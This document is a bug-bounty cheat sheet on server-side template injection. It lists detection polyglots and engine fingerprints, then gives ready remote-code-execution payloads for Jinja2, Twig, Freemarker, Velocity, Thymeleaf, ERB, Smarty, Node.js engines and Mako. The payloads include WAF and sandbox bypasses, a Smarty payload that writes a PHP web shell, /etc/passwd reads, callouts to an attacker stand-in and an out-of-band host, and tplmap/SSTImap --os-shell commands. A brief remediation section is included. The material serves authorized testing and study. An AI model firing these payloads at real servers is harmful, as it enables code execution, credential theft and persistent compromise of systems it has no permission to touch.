# Server-Side Template Injection (SSTI)

SSTI occurs when user input is concatenated directly into a server-side template instead of being passed as data. Because template engines can evaluate expressions and access language internals, SSTI almost always escalates to **remote code execution**. It is consistently one of the highest-impact web bugs in bug bounty.

---

## Impact

- **Remote Code Execution** on the application server (the default end state for most engines).
- Arbitrary file read/write, SSRF, internal recon.
- Information disclosure (config, secrets, environment) even where RCE is sandboxed.

---

## Detection

### Step 1 — polyglot probe

Fire one string that breaks/evaluates across many engines and watch the response:

```
${{<%[%'"}}%\.
```

Then narrow with arithmetic — if `49` (or `7777777`) renders, the expression was evaluated server-side:

```
${7*7}            -> Freemarker, Velocity, JSP EL, Spring, Thymeleaf
{{7*7}}           -> Jinja2, Twig, Nunjucks, Handlebars(no), Django(no)
{{7*'7'}}         -> Jinja2 = 7777777   | Twig = 49   (distinguishes the two)
#{7*7}            -> Ruby ERB / slim, JSF
<%= 7*7 %>        -> ERB (Ruby), EJS
${{7*7}}          -> Generic
#{ 7*7 }          -> Thymeleaf inline / Pug
{7*7}             -> Smarty(no eval), some others
*{7*7}            -> Thymeleaf
@(7*7)            -> Razor (.NET)
```

### Step 2 — engine fingerprint

Use the decision logic (PortSwigger's tree) and the **Hackmanit Template Injection Table** (44 engines, interactive). Key tells:

```
{{7*7}} renders 49 and {{7*'7'}} errors      -> Twig
{{7*7}} renders 49 and {{7*'7'}} = 7777777   -> Jinja2
${7*7} works, ${"z".join("ab")} works        -> Freemarker / Velocity (Java)
<%= 7*7 %> works                             -> ERB / EJS
@(7*7) works                                 -> Razor
{{ }} no eval but {%  %} tags work           -> Django (sandboxed-ish)
```

### Blind / OOB detection

```
{{ get_user("$(nslookup x.oast.fun)") }}                # generic
{{ ''.__class__.__mro__[1].__subclasses__() }}          # Jinja2 introspection
${"".getClass().forName("java.lang.Runtime")...}        # Java OOB via DNS
```

---

## Exploitation by engine

### Jinja2 / Flask (Python) — the classic

```python
# Confirm
{{7*7}}  -> 49      {{7*'7'}} -> 7777777     {{config}}  (leaks Flask config/secrets)

# Read globals / dump everything
{{ config.items() }}
{{ self.__init__.__globals__ }}
{{ request.application.__globals__.__builtins__ }}

# RCE — popen (most reliable, modern)
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# RCE — subclass walk (when globals are stripped)
{{ ''.__class__.__mro__[1].__subclasses__() }}
# find index of subprocess.Popen, then:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}

# WAF-bypass / filter-bypass variants (no quotes, no underscores, no dots)
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
{{ ''[request.args.cls][request.args.mro][1]... }}   # smuggle blocked words via params
{{ (lipsum|attr(request.args.g)).os.popen(request.args.c).read() }}&g=__globals__&c=id
{{ cycler|attr(request.args.a) }}                    # bypass '.'
```

### Twig (PHP / Symfony)

```php
{{7*7}} -> 49     {{7*'7'}} -> 49 (vs Jinja 7777777)

# Twig <2.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Modern Twig (Symfony) — abuse filter/map
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
{{['cat /etc/passwd']|map('system')|join}}
{{[0]|reduce('system','id')}}
{{'/etc/passwd'|file_excerpt(1,30)}}                 # file read (Symfony)
{{app.request.server.get('SECRET')}}                 # config leak
```

### Freemarker (Java)

```java
${7*7}  ->  49
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
# Object construction RCE
${product.getClass().getProtectionDomain()...}
# new() builtin (if not sandboxed)
[#assign x = 'freemarker.template.utility.Execute'?new()]${ x('id') }
```

### Velocity (Java)

```java
#set($e="e")
#set($run=$e.getClass().forName("java.lang.Runtime"))
$run.getRuntime().exec("id")
# one-liner
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id").waitFor())
```

### Thymeleaf (Spring)

```java
${7*7}    *{7*7}    #{7*7}
# Expression-preprocessing RCE (__...__)
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec('curl ATTACKER')}__::.x
# In a fragment expression:
~{__${T(java.lang.Runtime).getRuntime().exec("id")}__}
```

### ERB / Ruby

```ruby
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= Open3.capture2('id') %>
```

### Smarty (PHP)

```php
{php}system('id');{/php}                      # old Smarty
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
{$smarty.version}                             # fingerprint
```

### Nunjucks / EJS / Handlebars / Pug (Node.js)

```javascript
# Nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

# EJS
<%= global.process.mainModule.require('child_process').execSync('id') %>

# Pug / Jade
#{ root.process.mainModule.require('child_process').execSync('id') }
- var x = global.process.mainModule.require('child_process').execSync('id')

# Handlebars (requires helper abuse / prototype)
{{#with "s" as |string|}}{{#with split as |conslist|}}...require('child_process')...{{/with}}{{/with}}
```

### Mako (Python)

```python
${__import__('os').popen('id').read()}
<%import os%>${os.popen('id').read()}
```

---

## Sandbox escapes & filter bypasses

- **Jinja2 sandboxed**: many CTF/real targets block `__`, `.`, quotes, or keywords. Bypass with `|attr()`, `request.args`/`request.cookies` to smuggle strings, `request|attr('application')`, hex/unicode in attribute access, and `()` via `cycler`/`lipsum`/`namespace`.
- **No-quotes file read (Twig)**: `{{'/etc/passwd'|file_excerpt(1,-1)}}`.
- **HTML auto-escape**: doesn't stop RCE (executes server-side before escaping); only affects displayed output.
- **Blocked `os`**: reach it via `lipsum.__globals__`, `cycler.__init__.__globals__`, or `joiner`.

```
# Jinja smuggle-via-request to dodge a WAF blocking 'os'/'popen'/'__'
?c=id&a=__globals__&b=popen
{{(cycler|attr(request.args.a)).os|attr(request.args.b)(request.args.c)|attr('read')()}}
```

---

## Tooling

| Tool | Use |
|------|-----|
| **tplmap** | Automatic SSTI detection + exploitation (`--os-shell`, file r/w, many engines) |
| **SSTImap** | Maintained successor to tplmap, modern engines |
| **Hackmanit Template Injection Table** | Polyglot lookup for 44 engines |
| **Burp Intruder** | Spray polyglots across params |
| **interactsh / Collaborator** | Blind/OOB SSTI confirmation |

```bash
# tplmap
python3 tplmap.py -u "https://TARGET/page?name=John*"
python3 tplmap.py -u "https://TARGET/page" -d "name=John*" --os-shell

# SSTImap
python3 sstimap.py -u "https://TARGET/?name=*" --os-shell
```

---

## Remediation

- Never build templates from user input. Pass user data as **template variables/context**, never as part of the template string.
- Use logic-less templates (e.g. Mustache) where untrusted templates are unavoidable.
- Run template rendering in a hardened sandbox (Jinja2 `SandboxedEnvironment`) and assume it is bypassable — combine with input validation.
- Patch/update engine versions (sandbox-escape CVEs are common).

---

## Payload Cheatsheet

```text
# Detect
${{<%[%'"}}%\.                 (polyglot)
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   @(7*7)
{{7*'7'}} -> 7777777 Jinja, 49 Twig
# Jinja2 RCE
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
# Twig RCE
{{['id']|filter('system')}}
{{['id',""]|sort('system')}}
# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity
#set($r=$e.getClass().forName("java.lang.Runtime")) $r.getRuntime().exec("id")
# Thymeleaf
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
# ERB
<%= `id` %>
# Nunjucks
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
# Mako
${__import__('os').popen('id').read()}
```

---

## References

- PortSwigger Web Security Academy — SSTI: https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings — SSTI: https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
- HackTricks — SSTI: https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- Hackmanit Template Injection Table: https://github.com/Hackmanit/template-injection-table
- YesWeHack — SSTI exploitation with RCE everywhere: https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
- Check Point Research — SSTI 2024: https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/
- tplmap: https://github.com/epinna/tplmap | SSTImap: https://github.com/vladko312/SSTImap
